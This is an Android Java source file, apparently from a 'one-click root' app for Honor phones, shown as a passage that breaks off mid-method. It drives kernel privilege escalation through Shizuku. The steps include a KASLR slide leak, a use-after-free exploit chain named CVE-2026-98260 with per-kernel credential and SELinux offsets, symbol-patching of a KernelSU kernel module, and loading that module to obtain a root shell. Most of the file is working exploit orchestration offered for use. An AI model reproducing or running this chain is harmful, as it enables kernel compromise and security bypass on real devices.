package com.aiden.honoroneclick;

import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.PowerManager;
import android.util.Log;
import android.view.HapticFeedbackConstants;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.activity.ComponentActivity;
import androidx.compose.ui.platform.ComposeView;
import androidx.core.content.FileProvider;
import androidx.core.view.WindowCompat;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import org.json.JSONArray;
import org.json.JSONObject;

import moe.shizuku.server.IRemoteProcess;
import moe.shizuku.server.IShizukuService;
import rikka.shizuku.Shizuku;
import rikka.shizuku.ShizukuBinderWrapper;

public final class MainActivity extends ComponentActivity implements UiActions {
    private static final int REQ_SHIZUKU = 1001;
    private static volatile String WORK;
    private static final String CVE_98260_ROOT_SOCKET_PREFIX =
            "/data/local/tmp/cve98260-root-";
    private static final long CVE_98260_QUIET_WAIT_MS = 15_000L;
    private static final long CVE_98260_POLL_INTERVAL_MS = 15_000L;
    private static final long CVE_98260_ROOT_TIMEOUT_MS = 5 * 60_000L;
    private static final String MANAGER = BuildConfig.ROOT_MANAGER_PACKAGE;
    private static final long MANAGER_VERSION_CODE = BuildConfig.ROOT_MANAGER_VERSION_CODE;
    private static final String MANAGER_CERT_SHA256 = BuildConfig.ROOT_MANAGER_CERT_SHA256;
    private static final String MANAGER_ASSET_SHA256 = BuildConfig.ROOT_MANAGER_ASSET_SHA256;
    private static final String MANAGER_ASSET_NAME = BuildConfig.ROOT_MANAGER_ASSET_NAME;
    private static final String MANAGER_NAME = BuildConfig.ROOT_MANAGER_NAME;
    private static final String SHIZUKU_ASSET_SHA256 =
            "6e273ab0e991c4e79bc8b1bbb9b9dd739ccac1a8712a541a214078886b7b790f";

    private static final class KernelProfile {
        final String id;
        final String kernel;
        final long timerLink;
        final long credLink;
        final long slideSiteLow;
        final long selinuxLink;
        final long userNs;
        final long rootUser;
        final long groups;
        final long ucounts;
        final int kitimerSize;
        final int kitimerNode;
        final int taskCred;
        final int credSize;
        final int taskSize;
        final int slabObjects;
        final int slabPages;
        final String moduleAsset;
        final String symbolsAsset;

        KernelProfile(String id, String kernel, long timerLink, long credLink,
                      long slideSiteLow, long selinuxLink, long userNs,
                      long rootUser, long groups, long ucounts,
                      int kitimerSize, int kitimerNode,
                      int taskCred, int credSize, int taskSize,
                      int slabObjects, int slabPages,
                      String moduleAsset, String symbolsAsset) {
            this.id = id;
            this.kernel = kernel;
            this.timerLink = timerLink;
            this.credLink = credLink;
            this.slideSiteLow = slideSiteLow;
            this.selinuxLink = selinuxLink;
            this.userNs = userNs;
            this.rootUser = rootUser;
            this.groups = groups;
            this.ucounts = ucounts;
            this.kitimerSize = kitimerSize;
            this.kitimerNode = kitimerNode;
            this.taskCred = taskCred;
            this.credSize = credSize;
            this.taskSize = taskSize;
            this.slabObjects = slabObjects;
            this.slabPages = slabPages;
            this.moduleAsset = moduleAsset;
            this.symbolsAsset = symbolsAsset;
        }
    }

    private final Handler ui = new Handler(Looper.getMainLooper());
    private final Shizuku.OnBinderReceivedListener binderReceivedListener = this::refreshShizuku;
    private final Shizuku.OnBinderDeadListener binderDeadListener = this::refreshShizuku;
    private final Shizuku.OnRequestPermissionResultListener permissionResultListener =
            (request, result) -> refreshShizuku();
    private PowerManager.WakeLock wakeLock;
    private UiState uiState;
    private int progressValue = 4;
    private volatile boolean busy;
    private volatile String cve98260RootSocket;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        wakeLock = ((PowerManager) getSystemService(POWER_SERVICE))
                .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "HonorOneClick:run");
        wakeLock.setReferenceCounted(false);
        Window window = getWindow();
        window.setStatusBarColor(Color.TRANSPARENT);
        window.setNavigationBarColor(Color.TRANSPARENT);
        WindowCompat.setDecorFitsSystemWindows(window, false);
        uiState = new UiState();
        refreshManagerStatus();
        ComposeView composeView = new ComposeView(this);
        ComposeBridge.attach(composeView, uiState, this);
        setContentView(composeView);
        Shizuku.addBinderReceivedListenerSticky(binderReceivedListener);
        Shizuku.addBinderDeadListener(binderDeadListener);
        Shizuku.addRequestPermissionResultListener(permissionResultListener);
        refreshShizuku();
    }

    @Override
    protected void onResume() {
        super.onResume();
        refreshManagerStatus();
        refreshShizuku();
    }

    @Override
    protected void onDestroy() {
        Shizuku.removeBinderReceivedListener(binderReceivedListener);
        Shizuku.removeBinderDeadListener(binderDeadListener);
        Shizuku.removeRequestPermissionResultListener(permissionResultListener);
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        super.onDestroy();
    }

    private void refreshManagerStatus() {
        boolean installed = isOfficialManagerInstalled();
        ui.post(() -> {
            if (busy || uiState.getRootReady()) {
                uiState.setManagerInstalled(installed);
                return;
            }
            if (installed) {
                uiState.updateManager("已安装", true, StatusTone.READY);
            } else {
                uiState.updateManager("未安装", false, StatusTone.WARNING);
            }
        });
    }

    private void refreshShizuku() {
        try {
            boolean ping = Shizuku.pingBinder();
            boolean permission = ping && Shizuku.checkSelfPermission()
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
            if (permission) {
                ui.post(() -> {
                    uiState.updateShizuku("已授权", true, StatusTone.READY);
                    if (!busy && !uiState.getRootReady()) {
                        uiState.setStatus("Shizuku 已就绪",
                                "公开 AIDL 通道可用，可以开始提权流程",
                                StatusTone.READY, true);
                    }
                });
                new Thread(this::refreshKernelProfile, "honor-kernel-profile").start();
            } else if (ping) {
                ui.post(() -> {
                    uiState.updateShizuku("待授权", false, StatusTone.WARNING);
                    if (!busy && !uiState.getRootReady()) {
                        uiState.setStatus("等待授权",
                                "Shizuku 服务已发现，请点击 01 授予本应用权限",
                                StatusTone.WARNING, false);
                    }
                });
            } else {
                ui.post(() -> {
                    uiState.updateShizuku("未连接", false, StatusTone.WARNING);
                    if (!busy && !uiState.getRootReady()) {
                        uiState.setStatus("Shizuku 未运行",
                                "先通过无线调试启动原版 Shizuku 服务",
                                StatusTone.WARNING, false);
                    }
                });
            }
        } catch (Throwable t) {
            ui.post(() -> {
                uiState.updateShizuku("异常", false, StatusTone.ERROR);
                if (!busy && !uiState.getRootReady()) {
                    uiState.setStatus("Shizuku 未连接",
                            "无法读取 Shizuku binder",
                            StatusTone.ERROR, false);
                }
            });
        }
    }

    private void requestShizuku() {
        try {
            if (!Shizuku.pingBinder()) {
                openShizukuInstaller();
                return;
            }
            if (Shizuku.checkSelfPermission() !=
                    android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Shizuku.requestPermission(REQ_SHIZUKU);
                log("已请求 Shizuku 权限，请在系统授权页允许。");
            } else {
                refreshShizuku();
                log("Shizuku 权限已就绪。");
            }
        } catch (Throwable t) {
            logError("Shizuku 请求失败：" + t);
        }
    }

    private void openManagerInstaller() {
        try {
            if (isOfficialManagerInstalled()) {
                log("已检测到官方 " + MANAGER_NAME + " 管理器，签名和版本校验通过。");
                launchPackage(MANAGER);
                return;
            }
            throw new IllegalStateException("已安装的 " + MANAGER_NAME + " 管理器签名或版本不匹配");
        } catch (Exception missing) {
            try {
                installBundledApk(MANAGER_ASSET_NAME);
            } catch (Throwable t) {
                logError("无法启动管理器安装器：" + t);
            }
        }
    }

    @Override
    public void onConnectShizuku() {
        requestShizuku();
    }

    @Override
    public void onOpenKernelSu() {
        openManagerInstaller();
    }

    @Override
    public void onStartRoot() {
        getWindow().getDecorView().performHapticFeedback(
                HapticFeedbackConstants.CONFIRM);
        startPipeline();
    }

    @Override
    public void onSelectExploit(ExploitChoice choice) {
        uiState.setExploitChoice(choice);
        log("利用链选择：" + choice.getLabel());
    }

    private void refreshKernelProfile() {
        try {
            if (!Shizuku.pingBinder() || Shizuku.checkSelfPermission()
                    != android.content.pm.PackageManager.PERMISSION_GRANTED)
                return;
            String kernel = probe("uname -r").trim();
            if (kernel.isEmpty())
                return;
            ui.post(() -> uiState.updateKernel(kernel));
        } catch (Throwable ignored) {
        }
    }

    @Override
    public void onClearLogs() {
        uiState.clearLogs();
    }

    private void installBundledApk(String assetName) throws Exception {
        boolean shizuku = "ShizukuManager.apk".equals(assetName);
        byte[] expected = hexToBytes(shizuku
                ? SHIZUKU_ASSET_SHA256 : MANAGER_ASSET_SHA256);
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        File directory = new File(getCacheDir(), "installer");
        if (!directory.exists() && !directory.mkdirs())
            throw new IllegalStateException("无法创建安装缓存目录");
        File apk = new File(directory,
                shizuku ? "ShizukuManager.apk" : MANAGER_ASSET_NAME);
        try (InputStream in = getAssets().open(assetName);
             OutputStream out = new FileOutputStream(apk)) {
            byte[] b = new byte[65536];
            int n;
            while ((n = in.read(b)) > 0) {
                out.write(b, 0, n);
                digest.update(b, 0, n);
            }
            out.flush();
        }
        if (!MessageDigest.isEqual(expected, digest.digest())) {
            apk.delete();
            throw new IllegalStateException((shizuku ? "Shizuku" : MANAGER_NAME)
                    + " 安装包校验失败");
        }
        Uri uri = FileProvider.getUriForFile(
                this, getPackageName() + ".fileprovider", apk);
        Intent prompt = new Intent(Intent.ACTION_VIEW)
                .setDataAndType(uri, "application/vnd.android.package-archive")
                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                        | Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(prompt);
        log("已打开系统安装页，请确认安装官方 "
                + (shizuku ? "Shizuku" : MANAGER_NAME) + "。");
    }

    private boolean isOfficialManagerInstalled() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    MANAGER, PackageManager.GET_SIGNING_CERTIFICATES);
            if (info.getLongVersionCode() != MANAGER_VERSION_CODE
                    || info.signingInfo == null
                    || info.signingInfo.getApkContentsSigners() == null
                    || info.signingInfo.getApkContentsSigners().length == 0)
                return false;
            byte[] cert = info.signingInfo.getApkContentsSigners()[0].toByteArray();
            String actual = toHex(MessageDigest.getInstance("SHA-256").digest(cert));
            return MANAGER_CERT_SHA256.equals(actual);
        } catch (Throwable ignored) {
            return false;
        }
    }

    private void openShizukuInstaller() {
        try {
            getPackageManager().getPackageInfo("moe.shizuku.privileged.api", 0);
            launchPackage("moe.shizuku.privileged.api");
            log("已打开 Shizuku。请先在 Shizuku 中启动服务，然后回来授权本应用。");
        } catch (Exception missing) {
            try {
                installBundledApk("ShizukuManager.apk");
            } catch (Throwable t) {
                logError("无法启动 Shizuku 安装器：" + t);
            }
        }
    }

    private void startPipeline() {
        if (busy) return;
        busy = true;
        progress(6);
        uiState.clearLogs();
        uiState.resetStages();
        uiState.setRootReady(false);
        uiState.setBusy(true);
        uiState.setStatus("正在验证环境", "检查设备、内核与 Shizuku 状态",
                StatusTone.RUNNING, false);
        setKernelState("检查中", StatusTone.RUNNING);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        log("开始执行。完整流程可能需要 10-30 分钟，屏幕已保持常亮。");
        wakeLock.acquire(30 * 60 * 1000L);
        new Thread(this::pipeline, "honor-oneclick").start();
    }

    private String probe(String command) {
        try {
            Process p = shellProcess(command);
            try (OutputStream ignored = p.getOutputStream()) {
            }
            String out = readAll(p.getInputStream());
            String err = readAll(p.getErrorStream());
            p.waitFor();
            return out + err;
        } catch (Throwable t) {
            return "";
        }
    }

    private void pipeline() {
        try {
            if (!Shizuku.pingBinder())
                throw new IllegalStateException("Shizuku 未运行，请先启动服务");
            if (Shizuku.checkSelfPermission() !=
                    android.content.pm.PackageManager.PERMISSION_GRANTED)
                throw new IllegalStateException("Shizuku 权限未授予");
            stage("检查设备", 14);
            String kernel = shell("uname -r").trim();
            String model = shell("getprop ro.product.model").trim();
            String device = shell("getprop ro.product.device").trim();
            ui.post(() -> uiState.updateKernel(kernel));
            log("model=" + model + " device=" + device + " kernel=" + kernel);
            log("实际内核：" + kernel + "；自动路由："
                    + SupportedKernels.recommendedFor(kernel).getLabel());

            ExploitChoice requested = uiState.getExploitChoice();
            ExploitChoice route = resolveExploit(kernel, requested);
            log("最终利用链：" + route.getLabel());

            setSystemStatus("正在准备提权", "已选择 " + route.getLabel() + " 利用链",
                    StatusTone.RUNNING, false);
            stage("准备公共组件", 24);
            prepareWorkDirectory();
            stageCommonAssets();

            stage("检查已有 " + MANAGER_NAME, 34);
            boolean moduleLive = shell(
                    "grep -qi kernelsu /proc/modules && echo LIVE || echo OFF").contains("LIVE");
            setKernelState(moduleLive ? "模块已加载" : "模块未加载",
                    moduleLive ? StatusTone.READY : StatusTone.IDLE);
            String existingUid = moduleLive
                    ? shell("timeout 15 /system/bin/su -c 'id -u' 2>/dev/null || true").trim()
                    : "";
            log("module=" + (moduleLive ? "Live" : "未加载")
                    + " existing su uid=" + emptyAsUnknown(existingUid));
            if (moduleLive && !"0".equals(existingUid))
                setKernelState("需初始化", StatusTone.WARNING);
            if (moduleLive) {
                stage("复用现有 " + MANAGER_NAME, 72);
                setSystemStatus("正在接管 " + MANAGER_NAME, "复用本次启动已加载的模块",
                        StatusTone.RUNNING, false);
                String grant = initializeKernelSU();
                log(grant.trim());
                finishRoot(route, true);
                return;
            }

            if (route == ExploitChoice.CVE_98260) {
                runCve98260Pipeline(kernel);
            } else if (route == ExploitChoice.CVE_99491) {
                runCve99491Pipeline(kernel);
            } else {
                runCve98260Pipeline(kernel);
            }
            finishRoot(route, false);
        } catch (Throwable t) {
            setKernelState("未就绪", StatusTone.ERROR);
            ui.post(() -> uiState.failCurrentStage());
            ui.post(() -> {
                uiState.setStatus("提权未完成",
                        "查看日志；若已进入 98260 内存回收阶段，不要立即重试，先重启设备",
                        StatusTone.ERROR, false);
            });
            logError("✗ " + t);
        } finally {
            busy = false;
            ui.post(() -> {
                uiState.setBusy(false);
                getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                if (wakeLock != null && wakeLock.isHeld()) {
                    wakeLock.release();
                }
            });
        }
    }

    private static boolean isKnownCve98260Kernel(String kernel) {
        return SupportedKernels.supports98260(kernel);
    }

    private static boolean isCve99491Kernel(String kernel) {
        return SupportedKernels.supports99491(kernel);
    }

    private ExploitChoice resolveExploit(String kernel, ExploitChoice requested) {
        if (requested == ExploitChoice.CVE_99491)
            return ExploitChoice.CVE_99491;
        if (requested == ExploitChoice.CVE_98260)
            return ExploitChoice.CVE_98260;
        if (isCve99491Kernel(kernel))
            return ExploitChoice.CVE_99491;
        if (isKnownCve98260Kernel(kernel))
            return ExploitChoice.CVE_98260;
        return ExploitChoice.CVE_98260;
    }

    private void stageCommonAssets() throws Exception {
        stageAsset("ksu_grant", WORK + "/ksu_grant", "755");
        stageAsset("ksu_grant.sh", WORK + "/ksu_grant.sh", "755");
        stageAsset("root_stage.sh", WORK + "/root_stage.sh", "755");
        stageAsset("ksud", WORK + "/ksud", "755");
    }

    private KernelProfile findKernelProfile(String kernel) throws Exception {
        JSONObject root = new JSONObject(new String(
                readAsset("exploit-profiles.json"), StandardCharsets.UTF_8));
        JSONArray profiles = root.getJSONArray("profiles");
        for (int i = 0; i < profiles.length(); i++) {
            JSONObject p = profiles.getJSONObject(i);
            if (!kernel.equals(p.getString("kernel"))) continue;
            if (p.has("vulnerable") && !p.getBoolean("vulnerable"))
                throw new IllegalStateException("该内核配置未通过漏洞路径检查：" + kernel);
            return profileFromJson(p);
        }
        throw new IllegalStateException(
                "没有与实际内核匹配的 98260 配置：" + kernel);
    }

    private KernelProfile profileFromJson(JSONObject p) throws Exception {
        return new KernelProfile(
                p.getString("id"),
                p.getString("kernel"),
                Long.parseUnsignedLong(p.getString("timer_link")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("cred_link")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("slide_site_low")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("selinux_link")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("user_ns")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("root_user")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("groups")
                        .replaceFirst("^0x", ""), 16),
                Long.parseUnsignedLong(p.getString("ucounts")
                        .replaceFirst("^0x", ""), 16),
                p.getInt("kitimer_size"),
                p.getInt("kitimer_node"),
                p.getInt("task_cred"),
                p.getInt("cred_size"),
                p.optInt("task_size", 0),
                p.getInt("slab_objects"),
                p.getInt("slab_pages"),
                p.getString("module_asset"),
                p.getString("symbols_asset"));
    }

    private void runCve98260Pipeline(String kernel) throws Exception {
        KernelProfile profile = findKernelProfile(kernel);
        log("98260 内核配置：" + profile.id + " · " + kernel);
        stage("准备 CVE-2026-98260 组件");
        for (String name : new String[]{"cve98260_plant", "cve98260_slide",
                "cve98260_su", "cve98260_module"}) {
            stageAsset(name, WORK + "/" + name, "755");
        }

        String activeSocket = findReusableCve98260RootSocket();
        boolean reuseRoot = activeSocket != null;
        cve98260RootSocket = reuseRoot
                ? activeSocket
                : CVE_98260_ROOT_SOCKET_PREFIX
                        + Long.toHexString(System.nanoTime()) + ".sock";
        if (reuseRoot) {
            log("发现本次启动已有的 98260 root 通道，直接复用：" + cve98260RootSocket);
        } else {
            log("98260 socket=" + cve98260RootSocket);
            String parked = probe("pidof cve98260_plant 2>/dev/null").trim();
            if (!parked.isEmpty())
                throw new IllegalStateException(
                        "检测到已有 98260 进程（pid " + parked + "）但 root 通道不可用；请重启设备，不要重复启动");
            log("98260 CLI 等价路径：跳过预检，启动后静默等待。");
        }

        stage("抓取 98260 KASLR");
        String probeOut = shell("cd " + WORK + " && ./cve98260_slide"
                + " --site-low " + hex(profile.slideSiteLow));
        long slide = parseCve98260Slide(probeOut, profile.timerLink);
        log("98260 slide=" + hex(slide));

        if (!reuseRoot) {
            stage("启动 CVE-2026-98260");
            setSystemStatus("正在获取 Root", "98260 正在回收 timer slab，可能持续数分钟", false);
            String start = shell("cd " + WORK
                    + " && if ! rm -f cve98260.log '" + cve98260RootSocket
                    + "'"
                    + "; then echo ROOT_SOCKET_CLEAN_FAILED; exit 1; fi"
                    + " && (PC98260_SOCK='" + cve98260RootSocket
                    + "' /system/bin/setsid ./cve98260_plant --slide " + hex(slide)
                    + " --timer-link " + hex(profile.timerLink)
                    + " --cred-link " + hex(profile.credLink)
                                        + " --selinux-link " + hex(profile.selinuxLink)
                    + " --user-ns " + hex(profile.userNs)
                    + " --root-user " + hex(profile.rootUser)
                    + " --groups " + hex(profile.groups)
                    + " --ucounts " + hex(profile.ucounts)
                    + " --kitimer-size " + profile.kitimerSize
                    + " --kitimer-node " + profile.kitimerNode
                    + (profile.taskSize > 0
                            ? " --task-size " + profile.taskSize : "")
                    + " --task-cred " + profile.taskCred
                    + " --cred-size " + profile.credSize
                    + " --slab-objects " + profile.slabObjects
                    + " --slab-pages " + profile.slabPages
                    + " --padding-timers 4096"
                    + " > cve98260.log 2>&1 < /dev/null & echo STARTED)");
            log(start.trim());
            if (start.contains("ROOT_SOCKET_CLEAN_FAILED")
                    || !start.contains("STARTED"))
                throw new IllegalStateException(
                        "98260 启动失败：残留 root Socket 无法清理，请重启设备后重试");
            waitForCve98260Root();
        }

        stage("生成 " + MANAGER_NAME + " 模块");
        byte[] template = readAsset(profile.moduleAsset);
        Map<String, Long> symbols = loadSymbols(profile.symbolsAsset);
        byte[] module = patchModule(template, symbols, slide);
        stageBytes("ksu-patched.ko", module, "644");

        stage("加载 " + MANAGER_NAME + " 模块");
        boolean moduleLive = shell(
                "grep -qi kernelsu /proc/modules && echo LIVE || echo OFF")
                .contains("LIVE");
        if (!moduleLive) {
            String load = shell(cve98260SuCommand("-c '"
                    + WORK + "/cve98260_module " + WORK + "/ksu-patched.ko'"));
            log(load.trim());
        } else {
            log(MANAGER_NAME + " 模块已处于加载状态，跳过 finit_module。");
        }
        if (!waitForKernelSuModule())
            throw new IllegalStateException(MANAGER_NAME + " 模块加载失败");
        setKernelState("模块已加载", StatusTone.READY);

        // KernelSU 会把 SELinux 恢复为 Enforcing。此后的 bootstrap socket
        // 可能不再可由 shell 连接，收尾必须只走 KernelSU 的 su 通道。
        stage("初始化 " + MANAGER_NAME + " 用户态");
        String grant = initializeKernelSU();
        log(grant.trim());
    }

    private long parseCve98260Slide(String text, long timerLink) {
        long found = 0;
        for (String line : text.split("\\r?\\n")) {
            int at = line.indexOf("site=");
            if (at < 0) continue;
            String token = line.substring(at + 5).split("\\s+")[0];
            try {
                long site = Long.parseUnsignedLong(
                        token.replaceFirst("^0x", ""), 16);
                long slide = site - timerLink;
                if (slide > 0 && (slide & 0xfffL) == 0) {
                    found = slide;
                    log("slide leak: " + line.trim());
                }
            } catch (NumberFormatException ignored) {
            }
        }
        if (found == 0)
            throw new IllegalStateException("98260 KASLR 探针没有得到有效 site");
        return found;
    }

    private boolean waitForKernelSuModule() throws Exception {
        for (int i = 0; i < 20; i++) {
            if (shell("grep -qi kernelsu /proc/modules && echo LIVE || echo OFF")
                    .contains("LIVE"))
                return true;
            Thread.sleep(500);
        }
        return false;
    }

    private String findReusableCve98260RootSocket() throws Exception {
        String sockets = probe("cat /proc/net/unix 2>/dev/null | tr ' ' '\\n'"
                + " | grep '^" + CVE_98260_ROOT_SOCKET_PREFIX
                + "' | sort -u").trim();
        if (sockets.isEmpty())
            return null;
        for (String path : sockets.split("\\r?\\n")) {
            if (!isSafeCve98260SocketPath(path)) continue;
            String uid = probe("PC98260_SOCK='" + path + "' "
                    + WORK + "/cve98260_su -c 'id -u' 2>/dev/null").trim();
            if ("0".equals(uid))
                return path;
        }
        throw new IllegalStateException(
                "检测到活动中的 98260 rootd，但 root 通道不可用；请重启设备后重试");
    }

    private String cve98260SuCommand(String arguments) {
        return "PC98260_SOCK='" + cve98260RootSocket + "' "
                + WORK + "/cve98260_su " + arguments;
    }

    private static boolean isSafeCve98260SocketPath(String path) {
        return path != null
                && path.length() < 108
                && path.matches("^/data/local/tmp/cve98260-root[-A-Za-z0-9_.]*\\.sock$");
    }

    private void waitForCve98260Root() throws Exception {
        log("98260 已启动；静默等待 " + TimeUnit.MILLISECONDS.toSeconds(
                CVE_98260_QUIET_WAIT_MS) + " 秒后再验收。");
        Thread.sleep(CVE_98260_QUIET_WAIT_MS);

        long deadline = System.currentTimeMillis() + CVE_98260_ROOT_TIMEOUT_MS;
        while (System.currentTimeMillis() < deadline) {
            String snapshot = probe(
                    "echo __H1_ID__; "
                            + cve98260SuCommand("-c 'id' 2>/dev/null")
                            + "; echo __H1_LOG__; tail -n 80 " + WORK
                            + "/cve98260.log 2>/dev/null; echo __H1_PID__; "
                            + "pidof cve98260_plant 2>/dev/null");
            int idAt = snapshot.indexOf("__H1_ID__");
            int logAt = snapshot.indexOf("__H1_LOG__");
            int pidAt = snapshot.indexOf("__H1_PID__");
            String id = idAt >= 0
                    ? snapshot.substring(idAt + "__H1_ID__".length(),
                            logAt >= 0 ? logAt : snapshot.length()).trim()
                    : snapshot.trim();
            String tail = logAt >= 0
                    ? snapshot.substring(logAt + "__H1_LOG__".length(),
                            pidAt >= 0 ? pidAt : snapshot.length()).trim()
                    : "";
            String running = pidAt >= 0
                    ? snapshot.substring(pidAt + "__H1_PID__".length()).trim()
                    : "";

            if (id.contains("uid=0")) {
                log("98260 root 通道已就绪：" + id.replace("\n", " | "));
                return;
            }
            if (tail.contains("unsafe state; holding process")
                    || tail.contains("leak failed")) {
                logImportantLines(tail, "");
                throw new IllegalStateException(
                        "98260 本轮回收失败并已停放 UAF 进程；请重启设备后再试");
            }
            if (running.isEmpty() && tail.isEmpty())
                throw new IllegalStateException(
                        "98260 进程未启动且没有日志；请重启设备后重试");

            logImportantLines(tail, "");
            progress(Math.min(78, progressValue + 1));
            Thread.sleep(CVE_98260_POLL_INTERVAL_MS);
        }
        throw new IllegalStateException("98260 等待 root 超时；请重启设备后再次运行");
    }

    private void logImportantLines(String text, String prefix) {
        int shown = 0;
        for (String line : text.split("\\r?\\n")) {
            String trimmed = line.trim();
            if (trimmed.isEmpty()) continue;
            if (!prefix.isEmpty() && !trimmed.contains(prefix)) continue;
            log("  " + (trimmed.length() > 220 ? trimmed.substring(0, 220) + "…" : trimmed));
            if (++shown >= 12) return;
        }
    }

    private void finishRoot(ExploitChoice route, boolean reused) {
        setKernelState("运行中", StatusTone.SUCCESS);
        stage("完成", 100);
        ui.post(() -> uiState.completeCurrentStage());
        progress(100);
        showRootReady();
        log(reused
                ? "🎉 root 已就绪；已复用当前内核中的 " + MANAGER_NAME + "。"
                : "🎉 root 成功；利用链 " + route.getLabel()
                        + "，" + MANAGER_NAME + " 管理器已可管理授权与模块。");
        launchPackage(MANAGER);
    }

    private String initializeKernelSU() throws Exception {
            shell("cp " + WORK + "/root_stage.sh /data/local/tmp/root_stage.sh"
                    + " && chmod 755 /data/local/tmp/root_stage.sh");
            String grant = shell("cd " + WORK + " && ./ksu_grant");
            if (!grant.contains("grant_root_rc=0") || !grant.contains("ROOT_STAGE_OK"))
                throw new IllegalStateException(MANAGER_NAME + " root fd 初始化失败");
            String rootIdentity = shell("cat " + WORK + "/root_id").trim();
            log("root identity: " + rootIdentity.replace("\n", " | "));
            if (!rootIdentity.contains("uid=0(root)") || !rootIdentity.contains("context=u:r:ksu:s0"))
                throw new IllegalStateException(MANAGER_NAME + " root 身份验收失败");
            // Check from a fresh shell without env/timeout, which bypass
            // mksh's access() preflight and can hide broken cached credentials.
            String directSu = shell("/system/bin/su -c id").trim();
            log("direct su identity: " + directSu.replace("\n", " | "));
            if (!directSu.contains("uid=0(root)") || !directSu.contains("context=u:r:ksu:s0"))
                throw new IllegalStateException(
                        "普通 shell su 验收失败；请重启设备后重新提权，避免复用旧 " + MANAGER_NAME + " 模块");
            return grant;
    }

    private Map<String, Long> loadSymbols(String assetName) throws Exception {
        return parseSymbolMap(readAsset(assetName));
    }

    static Map<String, Long> parseSymbolMap(byte[] data) {
        Map<String, Long> map = new HashMap<>(180000);
        for (String line : new String(data, StandardCharsets.UTF_8).split("\n")) {
            String s = line.trim();
            String[] parts = s.split("\\s+", 3);
            if (parts.length < 2) continue;
            try {
                long value = Long.parseUnsignedLong(parts[0], 16);
                String name;
                if (parts.length == 3 && parts[1].length() == 1
                        && Character.isLetter(parts[1].charAt(0))) {
                    name = parts[2];
                } else {
                    int sp = s.indexOf(' ');
                    name = s.substring(sp + 1).trim();
                }
                map.put(name, value);
            } catch (NumberFormatException ignored) {}
        }
        return map;
    }

    private static byte[] patchModule(byte[] raw, Map<String, Long> symbols, long slide) {
        ByteBuffer b = ByteBuffer.wrap(raw).order(ByteOrder.LITTLE_ENDIAN);
        long shoff = b.getLong(0x28);
        int shentsize = b.getShort(0x3a) & 0xffff;
        int shnum = b.getShort(0x3c) & 0xffff;
        int shstr = b.getShort(0x3e) & 0xffff;
        int symSec = -1, modInfoSec = -1;
        for (int i = 0; i < shnum; i++) {
            int p = (int)(shoff + (long) i * shentsize);
            int type = b.getInt(p + 4);
            if (type == 2) symSec = i;
        }
        if (symSec < 0) throw new IllegalStateException("module 无 symtab");
        int shstrHdr = (int)(shoff + (long) shstr * shentsize);
        int shstrOff = (int)b.getLong(shstrHdr + 24);
        int shstrSize = (int)b.getLong(shstrHdr + 32);
        for (int i = 0; i < shnum; i++) {
            int p = (int)(shoff + (long) i * shentsize);
            int nameOff = b.getInt(p);
            if (nameOff <= 0 || nameOff >= shstrSize) continue;
            int end = shstrOff + nameOff;
            while (end < shstrOff + shstrSize && raw[end] != 0) end++;
            String name = new String(raw, shstrOff + nameOff,
                    end - shstrOff - nameOff, StandardCharsets.UTF_8);
            if (".modinfo".equals(name)) modInfoSec = i;
        }
        int symHdr = (int)(shoff + (long) symSec * shentsize);
        int symOff = (int)b.getLong(symHdr + 24);
        int symSize = (int)b.getLong(symHdr + 32);
        int link = b.getInt(symHdr + 40);
        int strHdr = (int)(shoff + (long) link * shentsize);
        int strOff = (int)b.getLong(strHdr + 24);
        int strSize = (int)b.getLong(strHdr + 32);
        int patched = 0;
        int repaired = 0;
        int undefined = 0;
        for (int p = symOff; p + 24 <= symOff + symSize; p += 24) {
            int nameOff = b.getInt(p);
            int shndx = b.getShort(p + 6) & 0xffff;
            if (shndx == 0xffff) {
                if (modInfoSec < 0) throw new IllegalStateException(
                        "module 含损坏节索引但无 .modinfo");
                b.putShort(p + 6, (short)modInfoSec);
                repaired++;
                continue;
            }
            if (nameOff <= 0 || nameOff >= strSize) continue;
            int end = strOff + nameOff;
            while (end < strOff + strSize && raw[end] != 0) end++;
            String name = new String(raw, strOff + nameOff, end - strOff - nameOff,
                    StandardCharsets.UTF_8);
            if (shndx != 0) continue;
            undefined++;
            Long value = symbols.get(name);
            if (value == null) continue;
            b.putShort(p + 6, (short)0xfff1);
            b.putLong(p + 8, value + slide);
            patched++;
        }
        if (patched == 0) throw new IllegalStateException(
                "模块符号补丁为空（未定义=" + undefined + "，匹配=" + patched + "）");
        if (repaired > 0) {
            Log.i("HOneClick", "module repaired section indexes=" + repaired);
        }
        return raw;
    }

    private String shell(String command) throws Exception {
        Process p = shellProcess(command);
        try (OutputStream ignored = p.getOutputStream()) {
        }
        ByteArrayOutputStream stdout = new ByteArrayOutputStream();
        ByteArrayOutputStream stderr = new ByteArrayOutputStream();
        Thread[] readers = new Thread[]{
